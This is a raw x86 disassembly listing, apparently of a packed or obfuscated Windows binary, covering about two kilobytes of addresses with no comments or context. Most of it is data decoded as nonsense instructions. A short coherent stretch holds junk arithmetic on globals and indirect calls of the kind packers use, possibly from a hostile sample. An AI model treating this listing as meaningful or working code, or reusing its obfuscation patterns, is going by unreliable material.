  40339e:	outs   dx,BYTE PTR ds:[esi]
  40339f:	repz mov ?,WORD PTR [esi-0x5caffd43]
  4033a6:	cmp    al,0x66
  4033a8:	in     al,0x59
  4033aa:	add    dl,dl
  4033ac:	inc    ebp
  4033ad:	cmp    eax,0x568853b4
  4033b2:	pop    ecx
  4033b3:	push   ebx
  4033b4:	enter  0xa4eb,0x2f
  4033b8:	pop    ebx
  4033ba:	lock jne 0x403404
  4033bd:	out    dx,eax
  4033be:	cs fxch st(1)
  4033c1:	outs   dx,DWORD PTR ds:[esi]
  4033c2:	fld    TBYTE PTR [ebx]
  4033c4:	add    edi,ebx
  4033c6:	lds    esi,FWORD PTR [edi]
  4033c8:	xchg   ebx,eax
  4033c9:	fisub  DWORD PTR [edi+edi*8-0x392cedf7]
  4033d0:	jmp    0x4033b7
  4033d2:	test   eax,0x4194b3a2
  4033d7:	je     0x403371
  4033d9:	cdq    
  4033da:	inc    esp
  4033db:	retf   0x81fd
  4033de:	hlt    
  4033df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033e0:	dec    ebp
  4033e1:	push   ebp
  4033e2:	push   ebx
  4033e3:	sub    BYTE PTR [ecx-0x77e33ee4],cl
  4033e9:	pop    ebp
  4033ea:	xor    ecx,DWORD PTR [edx+0x7f3b2514]
  4033f0:	add    edi,DWORD PTR [eax-0x3b4f8dd3]
  4033f6:	imul   ecx,DWORD PTR [ecx-0x250c74fd],0x567927db
  403400:	pop    edi
  403401:	pop    esp
  403402:	add    BYTE PTR [eax-0x8d1aa2b],al
  403408:	popf   
  403409:	ins    BYTE PTR es:[edi],dx
  40340a:	and    DWORD PTR [eax],esi
  40340c:	jecxz  0x403398
  40340e:	xchg   esp,eax
  40340f:	hlt    
  403410:	jg     0x40345e
  403412:	xor    DWORD PTR [ecx],eax
  403414:	icebp  
  403415:	mov    bh,BYTE PTR [esi-0x7b]
  403418:	jg     0x4033b9
  40341a:	in     al,dx
  40341b:	fisubr WORD PTR [edx-0x5e75cdcd]
  403421:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403422:	pop    esi
  403423:	rcr    BYTE PTR [ebx+0x21],0x19
  403427:	out    0xe6,eax
  403429:	(bad)  
  40342a:	mov    ah,0x54
  40342c:	sub    eax,0xb0e0c080
  403431:	out    dx,eax
  403432:	add    al,0x7d
  403434:	fs cmc 
  403436:	cld    
  403437:	(bad)  [esi]
  403439:	xchg   ecx,eax
  40343a:	jo     0x403429
  40343c:	cmp    edi,edx
  40343e:	repz cdq 
  403440:	in     al,0xe3
  403442:	xor    eax,0xa75d9a90
  403447:	nop
  403448:	iret   
  403449:	(bad)
  40344c:	cmp    bl,bh
  40344e:	xor    dh,BYTE PTR [edx]
  403450:	pop    ebp
  403451:	push   cs
  403452:	ds (bad) 
  403454:	jnp    0x40344a
  403456:	pop    ecx
  403457:	js     0x40340d
  403459:	jbe    0x403448
  40345b:	mov    ds:0x9e247b0f,al
  403460:	out    dx,eax
  403461:	xlat   BYTE PTR ds:[ebx]
  403462:	jp     0x403409
  403464:	mov    ?,WORD PTR [esi-0x42d6a49a]
  40346a:	pop    edi
  40346b:	add    DWORD PTR [ecx+0x48],ebx
  40346e:	jp     0x4034c0
  403470:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403471:	loope  0x403490
  403473:	data16 rcl bl,1
  403476:	push   ecx
  403477:	sbb    ecx,DWORD PTR [eax]
  403479:	push   0xffffff8b
  40347b:	jbe    0x403425
  40347d:	or     DWORD PTR [eax+edx*2-0x77],ecx
  403481:	bound  edx,QWORD PTR [ecx]
  403483:	stc    
  403484:	cwde   
  403485:	outs   dx,BYTE PTR es:[esi]
  403487:	xchg   esi,eax
  403488:	sbb    eax,0x1cbfab02
  40348d:	inc    edx
  40348e:	xchg   ecx,eax
  40348f:	adc    DWORD PTR [edx+0x3],esi
  403492:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403493:	aam    0xbe
  403495:	jno    0x4034b7
  403497:	push   0xffffffb5
  403499:	mov    edx,0x76ba37e1
  40349e:	mov    esp,0x404be47b
  4034a3:	hlt    
  4034a4:	shl    DWORD PTR [edx],0x79
  4034a7:	pop    ds
  4034a8:	scas   al,BYTE PTR es:[edi]
  4034a9:	ja     0x4034e0
  4034ab:	mov    dl,0x86
  4034ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034ae:	(bad)  
  4034af:	mov    bh,0x72
  4034b1:	xchg   ebx,ecx
  4034b3:	scas   eax,DWORD PTR es:[edi]
  4034b4:	dec    edx
  4034b5:	or     ah,BYTE PTR [ebx-0x363ac291]
  4034bb:	add    esp,DWORD PTR [ebx+ebx*4-0x5ea472ce]
  4034c2:	je     0x403507
  4034c4:	cmp    esi,DWORD PTR [eax]
  4034c6:	(bad)  
  4034c7:	sub    ecx,DWORD PTR [edx+ecx*2-0x3dbc17f3]
  4034ce:	sbb    al,0x5c
  4034d0:	cdq    
  4034d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034d2:	loopne 0x403494
  4034d4:	(bad)  
  4034d5:	push   eax
  4034d6:	mov    dh,0x78
  4034d8:	(bad)  
  4034d9:	fld    DWORD PTR [edx]
  4034db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034dc:	mov    cl,0x6e
  4034de:	sbb    al,0x8
  4034e0:	or     DWORD PTR [ebp+eiz*8-0x25],esi
  4034e4:	dec    eax
  4034e5:	jo     0x4034b8
  4034e7:	jb     0x403510
  4034e9:	cmp    ebp,eax
  4034eb:	inc    esi
  4034ec:	(bad)  
  4034ed:	mov    ecx,DWORD PTR [ebp-0x14]
  4034f0:	cmp    eax,DWORD PTR [ecx]
  4034f2:	mov    DWORD PTR ds:0x428123,0x673a
  4034fc:	jne    0x403a37
  403502:	jmp    0x4038e0
  403507:	sbb    ebp,esi
  403509:	fld    TBYTE PTR [ecx]
  40350b:	sbb    esp,DWORD PTR ds:0x5dedeb1b
  403511:	or     BYTE PTR [edx+0x2a],ch
  403514:	cmp    al,0xa1
  403516:	jo     0x4034db
  403518:	in     eax,0x18
  40351a:	sbb    BYTE PTR [esi+0x37181812],bl
  403520:	iret   
  403521:	xor    BYTE PTR cs:[esi+0x4b959e79],cl
  403528:	cli    
  403529:	dec    esi
  40352a:	jmp    0xdbee:0x27549dcf
  403531:	test   BYTE PTR ds:0x337d2de0,0xbf
  403538:	push   edi
  403539:	stc    
  40353a:	(bad)  
  40353b:	xchg   esp,eax
  40353c:	mov    ds:0xe6be8657,eax
  403541:	out    0x40,eax
  403543:	popf   
  403544:	push   eax
  403545:	into   
  403546:	outs   dx,BYTE PTR ds:[esi]
  403547:	fsubr  QWORD PTR ds:0x9b183fc5
  40354e:	(bad)  
  40354f:	push   edi
  403550:	sub    al,0x6e
  403552:	mov    WORD PTR [edx],ss
  403554:	fstp   TBYTE PTR [ecx-0x15909110]
  40355a:	and    BYTE PTR [esi+0x480a2277],ah
  403560:	mov    esp,0x2a750ffc
  403565:	sub    edx,DWORD PTR [ebx-0x123029ce]
  40356b:	ficomp DWORD PTR [eax-0x505d72de]
  403571:	push   cs
  403572:	mov    ebx,0xae0e7074
  403577:	stc    
  403578:	sub    BYTE PTR [esi+0x45],bh
  40357b:	call   0x22a1b16d
  403580:	jno    0x403519
  403582:	rcl    DWORD PTR [eax],1
  403584:	shl    DWORD PTR [edi],0xc9
  403587:	cmp    al,0xd4
  403589:	adc    cl,cl
  40358b:	dec    eax
  40358c:	sbb    DWORD PTR [ecx+0x2f],ebp
  40358f:	aas    
  403590:	push   ds
  403591:	xlat   BYTE PTR ds:[ebx]
  403592:	inc    ebx
  403593:	inc    edx
  403594:	in     eax,dx
  403595:	mov    edi,0xbc90f1a0
  40359a:	ds mov cl,0x1d
  40359d:	jecxz  0x403537
  40359f:	in     eax,dx
  4035a0:	add    DWORD PTR [eax+0x667cfe62],edi
  4035a6:	std    
  4035a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035a8:	xlat   BYTE PTR ds:[ebx]
  4035a9:	sbb    al,0x69
  4035ab:	adc    dl,BYTE PTR [ebx]
  4035ad:	jg     0x3d3504df
  4035b3:	outs   dx,BYTE PTR ds:[esi]
  4035b4:	fist   WORD PTR ds:0x399cee0
  4035ba:	add    DWORD PTR [ecx-0x71],edi
  4035bd:	in     eax,dx
  4035be:	fisttp WORD PTR [ecx-0x76]
  4035c1:	mov    eax,ds:0x8994df20
  4035c6:	shr    esi,cl
  4035c8:	test   al,0x90
  4035ca:	int    0x4d
  4035cc:	arpl   di,cx
  4035ce:	repnz adc eax,0x6853a9de
  4035d4:	jo     0x40358b
  4035d6:	or     edx,DWORD PTR [ebp-0x4b41b548]
  4035dc:	imul   BYTE PTR [edx]
  4035de:	cmp    cl,BYTE PTR [ebx-0x79]
  4035e1:	loope  0x40359c
  4035e3:	in     al,0x70
  4035e5:	and    al,0xc6
  4035e7:	mov    ecx,0xd11a1b32
  4035ec:	push   esi
  4035ed:	sbb    dh,BYTE PTR [edx]
  4035ef:	add    edx,ebx
  4035f1:	adc    edi,DWORD PTR [ecx-0x20d68b34]
  4035f7:	scas   eax,DWORD PTR es:[edi]
  4035f8:	nop
  4035f9:	test   eax,0x6c820223
  4035fe:	rol    edx,0x34
  403601:	fiadd  WORD PTR [eax-0x64832ca9]
  403607:	out    0xba,al
  403609:	mov    dl,0x93
  40360b:	dec    esi
  40360c:	mov    ebp,fs
  40360e:	jb     0x403620
  403610:	out    dx,al
  403611:	mov    dl,0xd1
  403613:	pop    ds
  403614:	push   esp
  403615:	ret    
  403616:	adc    bl,BYTE PTR [ecx]
  403618:	jbe    0x403601
  40361a:	mov    cl,0x67
  40361c:	cmp    DWORD PTR [ecx-0x743be776],edi
  403622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403623:	daa    
  403624:	cmp    ebx,DWORD PTR [esi+eax*8]
  403627:	and    edi,edx
  403629:	enter  0xccb9,0xd4
  40362d:	xchg   BYTE PTR [ecx],bl
  40362f:	scas   al,BYTE PTR es:[edi]
  403630:	mov    bh,BYTE PTR es:[ecx-0x36a05268]
  403637:	and    DWORD PTR [eax-0x5],edx
  40363a:	outs   dx,DWORD PTR ds:[esi]
  40363b:	adc    cl,BYTE PTR [edx+eax*1+0x8]
  40363f:	ds push 0xf78a3dd0
  403645:	inc    esp
  403646:	loop   0x40362e
  403648:	int    0x2f
  40364a:	inc    ebx
  40364b:	(bad)  
  40364c:	fdivp  st(2),st
  40364e:	lods   al,BYTE PTR ds:[esi]
  40364f:	and    DWORD PTR [esi+0x6e],ecx
  403652:	cmp    esp,edi
  403654:	xor    BYTE PTR [ebp+ecx*8-0x3552f997],dl
  40365b:	lods   eax,DWORD PTR ds:[esi]
  40365c:	shl    BYTE PTR [edi],1
  40365e:	add    BYTE PTR [ecx],ah
  403660:	or     eax,DWORD PTR [esi+esi*4+0x3c]
  403664:	inc    ecx
  403665:	pop    edi
  403666:	aaa    
  403667:	aad    0x3e
  403669:	icebp  
  40366a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40366b:	inc    ebp
  40366c:	ret    0x2f6c
  40366f:	(bad)  
  403670:	cld    
  403671:	mov    ds:0x2c203521,al
  403676:	mov    ds:0x60dee302,al
  40367b:	jmp    0x61436b7b
  403680:	mov    dl,0x39
  403682:	cld    
  403683:	mov    eax,ds:0x567dd03
  403688:	sti    
  403689:	stc    
  40368a:	dec    ebx
  40368b:	cdq    
  40368c:	sbb    DWORD PTR [ebx+ecx*2+0x7dee582f],ebp
  403693:	mov    DWORD PTR [eax+0x3bbe4630],edx
  403699:	(bad)  
  40369a:	nop
  40369b:	mov    al,ds:0x98224fb6
  4036a0:	arpl   sp,si
  4036a2:	sar    BYTE PTR [edx+0x48],0xf1
  4036a6:	lahf   
  4036a7:	int3   
  4036a8:	mov    dl,BYTE PTR [ebp-0x2b]
  4036ab:	fnstenv [ebp+esi*4+0x30]
  4036af:	sbb    BYTE PTR [esi],bl
  4036b1:	xchg   ebp,eax
  4036b2:	mov    bl,0xd3
  4036b4:	inc    ebp
  4036b5:	or     DWORD PTR [edx],esp
  4036b7:	add    ebp,DWORD PTR [esi+edx*8+0x2253afda]
  4036be:	push   ecx
  4036bf:	adc    DWORD PTR [ebp+0x32],edi
  4036c2:	(bad)  
  4036c3:	xor    eax,eax
  4036c5:	retf   0x84d4
  4036c8:	mov    DWORD PTR [ebx-0x754620f7],ecx
  4036ce:	cmp    bh,BYTE PTR [edi+0x38]
  4036d1:	leave  
  4036d2:	cmp    eax,DWORD PTR [edi+0x6f]
  4036d5:	jbe    0x4036e1
  4036d7:	cs das 
  4036d9:	gs fxch st(1)
  4036dc:	test   DWORD PTR [edi],ebx
  4036de:	call   0x5b4f8606
  4036e3:	push   esp
  4036e4:	in     eax,0x29
  4036e6:	jecxz  0x40375f
  4036e8:	jno    0x4036bb
  4036ea:	adc    al,0x91
  4036ec:	std    
  4036ed:	add    BYTE PTR [eax+edx*8],ah
  4036f0:	mov    al,ds:0x5077412c
  4036f5:	outs   dx,DWORD PTR ds:[esi]
  4036f6:	mov    ds:0xdef3dab6,al
  4036fb:	clc    
  4036fc:	xor    BYTE PTR [esi+0x451e98bc],dl
  403702:	xchg   bh,bl
  403704:	adc    ebp,edx
  403706:	out    dx,al
  403707:	jne    0x403726
  403709:	imul   esi
  40370b:	stos   DWORD PTR es:[edi],eax
  40370c:	xchg   ecx,eax
  40370d:	dec    edi
  40370e:	mov    ebx,0xc26033
  403713:	sbb    eax,0x146c6d1f
  403718:	das    
  403719:	cmp    al,0x77
  40371b:	inc    edx
  40371c:	mov    DWORD PTR [eax+0x6f61442c],ebp
  403722:	add    ebx,DWORD PTR [ebx-0x23]
  403725:	and    ah,BYTE PTR [ecx-0x65d2d9ad]
  40372b:	stc    
  40372c:	popa   
  40372d:	aas    
  40372e:	pop    ecx
  40372f:	add    BYTE PTR [ecx+0x5a],dl
  403732:	pop    ss
  403733:	repnz mov DWORD PTR [ebx-0x73d28104],esp
  40373a:	out    0x16,eax
  40373c:	pushf  
  40373d:	push   edx
  40373e:	imul   edi,DWORD PTR [ebp+0x7f8750bb],0x7c
  403745:	mov    BYTE PTR [eax+0x51],al
  403748:	mov    cl,0x67
  40374a:	mov    ch,dl
  40374c:	lahf   
  40374d:	push   cs
  40374e:	cs push esi
  403750:	mov    fs,WORD PTR [ebx+edx*4-0x2e]
  403754:	pusha  
  403755:	jns    0x4037c8
  403757:	test   edi,ecx
  403759:	clc    
  40375a:	inc    esi
  40375b:	les    esi,FWORD PTR [edx+0x28]
  40375e:	push   eax
  40375f:	(bad)  
  403760:	popf   
  403761:	and    esp,edi
  403763:	das    
  403764:	or     eax,0x46da03f8
  403769:	aad    0x95
  40376b:	inc    ecx
  40376c:	rol    DWORD PTR [eax-0x76],0xc2
  403770:	pusha  
  403771:	sbb    ah,BYTE PTR [eax+0x3a53c538]
  403777:	mov    dh,0x90
  403779:	xor    al,0x3e
  40377b:	jo     0x40379d
  40377d:	push   edx
  40377e:	inc    edi
  40377f:	lods   al,BYTE PTR ds:[esi]
  403780:	and    edi,DWORD PTR [ebx+eiz*8-0x7aa0d3aa]
  403787:	int    0xeb
  403789:	mov    eax,0x2aeddc35
  40378e:	sbb    eax,0x30d1c13c
  403793:	stos   BYTE PTR es:[edi],al
  403794:	outs   dx,DWORD PTR ds:[esi]
  403795:	xor    ch,BYTE PTR ds:0xbb9b753
  40379b:	cdq    
  40379c:	arpl   WORD PTR [edi],ax
  40379e:	fild   WORD PTR [ebp-0x6de50bdd]
  4037a4:	sahf   
  4037a5:	xor    esi,DWORD PTR [edi+0x63]
  4037a8:	jp     0x403757
  4037aa:	adc    BYTE PTR [edi-0x49],bl
  4037ad:	rcl    edx,0x5b
  4037b0:	and    esi,edx
  4037b2:	dec    eax
  4037b3:	xchg   ebp,eax
  4037b4:	sbb    eax,0x77a9a15a
  4037b9:	fmul   QWORD PTR [ecx]
  4037bb:	ins    DWORD PTR es:[edi],dx
  4037bc:	ins    DWORD PTR es:[edi],dx
  4037bd:	cmp    DWORD PTR [ebx],edi
  4037bf:	das    
  4037c0:	mov    ebp,0x69643cb0
  4037c5:	adc    esi,DWORD PTR [edi]
  4037c7:	xor    DWORD PTR [edx+0x177cb677],ebp
  4037cd:	loop   0x403795
  4037cf:	shl    BYTE PTR [edi-0x1b],0x45
  4037d3:	popa   
  4037d4:	gs adc bh,dl
  4037d7:	jbe    0x403842
  4037d9:	pop    ecx
  4037da:	enter  0xbb24,0xfd
  4037de:	sub    al,0xa3
  4037e0:	daa    
  4037e1:	ins    DWORD PTR es:[edi],dx
  4037e2:	dec    eax
  4037e3:	shr    DWORD PTR [ecx+0x35],cl
  4037e6:	in     eax,dx
  4037e7:	mov    ch,0xa0
  4037e9:	xchg   esi,eax
  4037ea:	jle    0x403805
  4037ec:	xor    DWORD PTR [ebx+ebx*4-0x38a5c57a],0xffffff8e
  4037f4:	daa    
  4037f5:	out    dx,eax
  4037f6:	in     al,dx
  4037f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037f8:	int3   
  4037f9:	cmp    DWORD PTR [edx+0x14e784f0],eax
  4037ff:	les    edi,FWORD PTR [ecx+0x79bb691b]
  403805:	xchg   al,ah
  403807:	mov    edi,0x318c17f3
  40380c:	pop    ebp
  40380d:	fsubr  DWORD PTR [eax]
  40380f:	cwde   
  403810:	add    ecx,DWORD PTR [ecx-0x1f]
  403813:	fs ret 
  403815:	ret    0x5c0
  403818:	push   eax
  403819:	mov    WORD PTR [ebp-0x44a1c7c0],gs
  40381f:	xchg   edi,eax
  403820:	sbb    ecx,DWORD PTR [esi-0xa]
  403823:	jns    0x403845
  403825:	leave  
  403826:	push   eax
  403827:	and    ecx,0xd0b4b966
  40382d:	xlat   BYTE PTR ds:[ebx]
  40382e:	push   edi
  40382f:	pop    ebx
  403830:	mov    ecx,0x508df8f2
  403835:	mov    bh,0x48
  403837:	cli    
  403838:	test   al,ah
  40383a:	daa    
  40383b:	and    eax,esi
  40383d:	pop    es
  40383e:	stos   BYTE PTR es:[edi],al
  40383f:	mov    ecx,0xe2268cb8
  403844:	rol    BYTE PTR [ecx-0x26345f4a],cl
  40384a:	div    ebp
  40384c:	call   0x6d4:0x1cb4c86d
  403853:	xor    al,0xef
  403855:	daa    
  403856:	mov    cs,WORD PTR [eax]
  403858:	mov    WORD PTR ss:[ecx-0x5662c69c],ss
  40385f:	xchg   ecx,eax
  403860:	js     0x4037eb
  403862:	cmp    BYTE PTR [esi+0x6afb8c18],0xc9
  403869:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40386a:	cs jle 0x403895
  40386d:	jnp    0x40383f
  40386f:	iret   
  403870:	mov    edi,0x5f5bcab4
  403875:	mov    bl,dl
  403877:	out    0x89,al
  403879:	js     0x40383c
  40387b:	stos   BYTE PTR es:[edi],al
  40387c:	sbb    esi,ecx
  40387e:	mov    ebx,0xe19b2c69
  403883:	out    0x35,al
  403885:	dec    ebx
  403886:	or     eax,0xcb29e7dc
  40388b:	sbb    cl,BYTE PTR [edi]
  40388d:	adc    DWORD PTR [edx-0x6e],edx
  403890:	retf   0x9b89
  403893:	push   esp
  403894:	push   edx
  403895:	jmp    0x6c6be00
  40389a:	sbb    BYTE PTR [ecx-0x47],0xc9
  40389e:	inc    ebp
  40389f:	loop   0x4038ac
  4038a1:	push   ds
  4038a2:	fstp   QWORD PTR [edx+esi*2+0x72]
  4038a6:	inc    esi
  4038a7:	aas    
  4038a8:	retf   
  4038a9:	sub    ecx,DWORD PTR [ecx+0x36]
  4038ac:	jb     0x4038b6
  4038ae:	pushf  
  4038af:	shr    DWORD PTR [edx-0x75f24267],1
  4038b5:	pop    esi
  4038b6:	sub    cl,BYTE PTR [ebp+0x175799a]
  4038bc:	repz xchg edx,eax
  4038be:	xor    al,0x53
  4038c0:	push   edx
  4038c1:	lods   al,BYTE PTR ds:[esi]
  4038c2:	jae    0x4038af
  4038c4:	push   0xc268d2af
  4038c9:	iret   
  4038ca:	shl    BYTE PTR [ebx-0x7b87e447],1
  4038d0:	sbb    eax,0x52b62fdc
  4038d5:	push   edi
  4038d6:	fdiv   QWORD PTR [edi+0x14414675]
  4038dc:	in     al,0x9a
  4038de:	cmp    eax,0xf4458b8a
  4038e3:	cmp    DWORD PTR ds:0x428223,0x0
  4038ea:	not    DWORD PTR ds:0x42811b
  4038f0:	mov    ecx,DWORD PTR ds:0x428247
  4038f6:	jmp    0x40393f
  4038fb:	not    ecx
  4038fd:	cmp    DWORD PTR ds:0x428223,0x0
  403904:	jne    0x403929
  40390a:	push   DWORD PTR [ebp-0x18]
  40390d:	call   DWORD PTR ds:0x428e98
  403913:	xor    edx,DWORD PTR ds:0x42820f
  403919:	neg    DWORD PTR ds:0x428223
  40391f:	xor    DWORD PTR ds:0x428117,0x12a5
  403929:	and    DWORD PTR ds:0x428367,0xf8b
  403933:	sbb    edx,DWORD PTR ds:0x42824b
  403939:	or     ecx,DWORD PTR ds:0x4281ff
  40393f:	mov    ecx,DWORD PTR [ebp+0x20]
  403942:	cmp    DWORD PTR ds:0x428123,0x0
  403949:	mov    DWORD PTR ds:0x428367,0x6ff3
  403953:	mov    edx,0x7151
  403958:	jmp    0x4039b3
  40395d:	mov    edx,0x2845
  403962:	cmp    DWORD PTR ds:0x428123,0x0
  403969:	jbe    0x403993
  40396f:	push   0x3359
  403974:	push   0x2d4b
  403979:	call   DWORD PTR ds:0x428d6c
  40397f:	adc    DWORD PTR ds:0x428257,0x42813f
  403989:	sbb    DWORD PTR ds:0x428243,0x4dea
  403993:	mov    edx,DWORD PTR ds:0x428343
  403999:	or     DWORD PTR ds:0x42821f,edx
  40399f:	xor    edx,edx
  4039a1:	add    edx,DWORD PTR ds:0x428247
  4039a7:	adc    edx,DWORD PTR ds:0x42822b
  4039ad:	mov    DWORD PTR ds:0x428247,edx
  4039b3:	xor    DWORD PTR [eax],ecx
  4039b5:	or     DWORD PTR ds:0x4281ff,0x56f
  4039bf:	mov    eax,DWORD PTR [ebp-0xc]
  4039c2:	mov    ecx,DWORD PTR [ebp+0x18]
  4039c5:	and    DWORD PTR ds:0x428267,edi
  4039cb:	mov    edx,DWORD PTR [ebp+0x1c]
  4039ce:	or     DWORD PTR ds:0x42825b,0x428367
  4039d8:	shrd   ecx,edx,0x2
  4039dc:	mov    DWORD PTR [ebp-0x14],ecx
  4039df:	adc    ecx,DWORD PTR ds:0x42813b
  4039e5:	mov    ecx,DWORD PTR [ebp+0x18]
  4039e8:	xor    DWORD PTR [ebp-0x14],edi
  4039eb:	adc    DWORD PTR ds:0x428117,0x4282df
  4039f5:	shr    edx,0x2
  4039f8:	or     DWORD PTR ds:0x428123,0x3344
  403a02:	mov    edx,DWORD PTR [ebp+0x1c]
  403a05:	sbb    DWORD PTR ds:0x42811b,0x4282b3
  403a0f:	xor    edx,edx
  403a11:	or     DWORD PTR ds:0x42822f,0xcfb
  403a1b:	or     edx,DWORD PTR [ebp-0x14]
  403a1e:	sub    DWORD PTR ds:0x428247,0x10bb
  403a28:	shl    ecx,0x1e
  403a2b:	sub    DWORD PTR ds:0x428117,0x1733
  403a35:	sub    DWORD PTR [eax],edx
  403a37:	cmp    DWORD PTR ds:0x428243,0x0
  403a3e:	mov    DWORD PTR ds:0x4282cf,0x3c7c
  403a48:	mov    ecx,0x6a18
  403a4d:	jmp    0x403aac
  403a52:	mov    eax,ds:0x428367
  403a57:	cmp    DWORD PTR ds:0x428243,0x0
  403a5e:	jne    0x403a98
  403a64:	push   0x773d
  403a69:	call   DWORD PTR ds:0x428d48
  403a6f:	mov    edx,DWORD PTR ds:0x4282ff
  403a75:	xor    ecx,ecx
  403a77:	xor    ecx,DWORD PTR ds:0x428393
  403a7d:	sub    edx,ecx
  403a7f:	or     edx,DWORD PTR [edx+ecx*1]
  403a82:	sbb    ecx,0x3181
  403a88:	xor    DWORD PTR ds:0x428143,0x1adf
  403a92:	xor    edx,0x1011
  403a98:	sbb    DWORD PTR ds:0x428137,0x2089
  403aa2:	or     DWORD PTR ds:0x42811b,0x113b
  403aac:	mov    eax,ds:0x422390
  403ab1:	cmp    DWORD PTR ds:0x428143,0x0
  403ab8:	mov    edx,0x6e0d
  403abd:	mov    edx,DWORD PTR ds:0x42820f
  403ac3:	mov    DWORD PTR ds:0x4281f3,0x403
  403acd:	jmp    0x403b18
  403ad2:	mov    DWORD PTR ds:0x4282e3,0x6b1a
  403adc:	mov    DWORD PTR ds:0x428143,0x1226
  403ae6:	cmp    DWORD PTR ds:0x428143,0x0
  403aed:	jle    0x403b06
  403af3:	push   0x4280e3
  403af8:	call   DWORD PTR ds:0x428d70
  403afe:	and    ecx,edx
  403b00:	adc    edx,0x75b0
  403b06:	or     DWORD PTR ds:0x42820b,ecx
  403b0c:	add    edx,0x4c60
  403b12:	add    DWORD PTR ds:0x42824f,ecx
  403b18:	mov    ecx,DWORD PTR [ebp-0xc]
  403b1b:	xor    DWORD PTR ds:0x42833b,0x2c42
  403b25:	mov    eax,DWORD PTR [eax]
  403b27:	add    DWORD PTR ds:0x42812b,edx
  403b2d:	jmp    0x403f0b
  403b32:	and    BYTE PTR [edi-0x43],dh
  403b35:	fdivr  QWORD PTR [edx+0x5e33201a]
  403b3b:	xchg   bh,dl
  403b3d:	mov    esp,0xbcd353da
  403b42:	dec    eax
  403b43:	fistp  WORD PTR [eax]
  403b45:	sbb    BYTE PTR [esi+0x78181812],bl
  403b4b:	clc    
  403b4c:	add    esp,ecx
  403b4e:	bound  ebx,QWORD PTR [edx-0x36d411ab]
  403b54:	pop    esi
  403b55:	into   
  403b56:	mov    ebx,0x8ffe554c
  403b5b:	pop    esp
  403b5c:	add    esp,DWORD PTR [ebp+ecx*8-0xf445035]
  403b63:	inc    edx
  403b64:	jae    0x403b82
  403b66:	xor    eax,0xdc4b1d
  403b6b:	out    0x23,al
  403b6d:	dec    esi
  403b6e:	ds jb  0x403ba3
  403b71:	out    dx,al
  403b72:	dec    esp
  403b73:	test   eax,0xc9e6dad1
  403b78:	adc    al,0x70
  403b7a:	rol    ch,cl
  403b7c:	int    0xb2
  403b7e:	xor    eax,0xea57c2f
  403b83:	jmp    0x3bb7:0x1086ade7
  403b8a:	imul   ebp,DWORD PTR [esi-0x19],0xd1aad254
  403b91:	mov    dl,0x30
  403b93:	or     eax,0x228aad13
  403b98:	outs   dx,BYTE PTR ds:[esi]
  403b99:	sahf   
  403b9a:	sbb    BYTE PTR [edx-0x34],ah
  403b9d:	shl    bl,1
  403b9f:	test   DWORD PTR [edx+0x5a],0x7dcdf36c
  403ba6:	call   0xf49b:0x1ddb2ef0
  403bad:	outs   dx,BYTE PTR ds:[esi]
  403bae:	sahf   
  403baf:	aad    0x87
  403bb1:	clc    
  403bb2:	fimul  WORD PTR [ecx+eiz*2+0x1045f15]
  403bb9:	dec    ebx
  403bba:	loop   0x403b60
  403bbc:	xchg   ecx,eax
  403bbd:	popa   
  403bbe:	add    ebx,DWORD PTR [ecx+0x5fe2aa50]
  403bc4:	sbb    ebp,DWORD PTR [esi+0x69d5e09c]
  403bca:	aad    0x12
  403bcc:	cmc    
  403bcd:	dec    ebp
  403bce:	repnz push eax
  403bd0:	cmp    edi,DWORD PTR [ebx-0x30]
  403bd3:	nop
  403bd4:	adc    BYTE PTR [esi-0x7515c9c],ah
  403bda:	push   es
  403bdb:	xor    eax,0x89ac1c0f
  403be0:	or     al,0x2d
  403be2:	mov    bh,BYTE PTR [edi]
  403be4:	sub    al,0x6c
  403be6:	das    
  403be7:	push   DWORD PTR [esi+0x5c5b7525]
  403bed:	mov    dh,0x10
  403bef:	inc    esp
  403bf0:	retf   0x233d
  403bf3:	ins    DWORD PTR es:[edi],dx
  403bf4:	rcr    DWORD PTR [esi-0x2545750e],1
  403bfa:	cmp    edi,edi
  403bfc:	jae    0x403bd4
  403bfe:	loopne 0x403c69
  403c00:	or     bh,BYTE PTR [eax-0xe]
  403c03:	push   eax
  403c04:	xchg   esi,eax
  403c05:	inc    eax
  403c06:	add    eax,0x618a031f
  403c0b:	jg     0x403c40
  403c0d:	inc    edi
  403c0e:	out    dx,eax
  403c0f:	push   0xffffff8c
  403c11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c12:	jno    0x403bbe
  403c14:	stc    
  403c15:	fld    QWORD PTR [ecx-0x26bbfebb]
  403c1b:	pop    ds
  403c1c:	push   esi
  403c1d:	arpl   WORD PTR [ebx-0x37],bp
  403c20:	cmp    BYTE PTR [ebx],bh
  403c22:	je     0x403be5
  403c24:	arpl   WORD PTR [eax+0x5a],bx
  403c27:	lds    esp,FWORD PTR [edi+eiz*1]
  403c2a:	call   0x1cfc24ff
  403c2f:	test   al,0x1c
  403c31:	and    al,0x34
  403c33:	push   edi
  403c34:	pushf  
  403c35:	sar    DWORD PTR [ebp+0x51f2215b],0x1d
  403c3c:	or     eax,ebp
  403c3e:	rcr    BYTE PTR [edx+eiz*1],0x9
  403c42:	mov    DWORD PTR [ecx+0x13],esp
  403c45:	and    BYTE PTR [ebp-0x3c],0x48
  403c49:	and    eax,0x2c9277ad
  403c4e:	sub    ecx,DWORD PTR [edi]
  403c50:	icebp  
  403c51:	sbb    DWORD PTR [ecx+0x1df797fc],ecx
  403c57:	push   ss
  403c58:	pop    ecx
  403c59:	je     0x403bf3
  403c5b:	jmp    0x5351:0x99fe9b3e
  403c62:	push   esi
  403c63:	ds retf 0xcdc2
  403c67:	cmp    bl,ah
  403c69:	scas   al,BYTE PTR es:[edi]
  403c6a:	jg     0x403c35
  403c6c:	(bad)  
  403c6d:	jle    0x403c92
